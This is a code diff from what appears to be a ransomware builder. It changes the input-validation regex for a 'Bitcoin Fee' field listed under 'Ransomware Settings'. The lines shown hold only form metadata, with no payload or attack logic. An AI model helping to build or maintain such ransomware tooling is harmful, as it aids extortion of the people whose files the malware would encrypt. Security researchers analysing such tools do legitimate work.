@@ -189,7 +189,7 @@ BUILDER_CONFIG_ITEMS = OrderedDict([
             "label": "Bitcoin Fee",
             "label_object_name": "BitcoinFeeLabel",
             "input_object_name": "BitcoinFeeTextCtrl",
-            "regex": re.compile("^([0-9]+(\.[0-9+]*))?$"),
+            "regex": re.compile("^([0-9]+(\.[0-9+]+)?)?$"),
             "example": "0.0897",
             "input_requirement": "A valid integer or floating point number",
             "config_area": "Ransomware Settings",
